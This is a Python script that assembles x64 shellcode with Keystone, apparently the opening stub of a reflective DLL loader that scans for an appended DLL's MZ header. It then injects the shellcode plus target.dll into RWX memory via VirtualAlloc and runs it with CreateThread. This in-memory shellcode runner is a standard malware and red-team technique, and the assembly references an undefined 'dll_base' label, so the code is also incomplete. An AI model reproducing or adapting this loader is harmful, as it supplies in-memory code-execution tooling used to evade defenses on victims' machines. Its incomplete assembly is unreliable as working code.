import ctypes, struct
from keystone import *
CODE = (
    "start:                              "
    "   int3                            ;"
    "   push rbp                        ;"
    "   mov rbp, rsp                    ;"
    "   add rsp, 0xfffffffffffffdf8     ;"  # Make some space in stack
    #STEP 0 : calculate dll images current base address
    "find_dllstart:                       "
    "   lea rsi, [rip+dll_base]         ;"  # Trying to get address of end of this shellcode
    "   mov rax, 0x5a4d                 ;"
    "dll_compare:                        "
    "   inc rsi                         ;"  # Increment the loop counter
    "   mov rdi, rsi                    ;"
    "   scasw                           ;"  # compares the content of the AX register to the word addressed by DI
    "   jne dll_compare                 ;"
    "dll_base_found:                     "
    "   mov r12, rsi                    ;"  # R12 has DLL base address
 )

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
print(shellcode)
# Write the (shellcode+target_dll) to a file for later use
with open("target.dll", "rb") as dll_file:  
   with open("shellcode.sh", "wb") as binary_file:
        shellcode += dll_file.read()
        binary_file.write(shellcode)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
ctypes.windll.kernel32.CreateThread.argtypes = (ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int))
space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
print("Shellcode located at address %s" % hex(space))
input("...ENTER TO EXECUTE SHELLCODE...")
handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(handle, -1);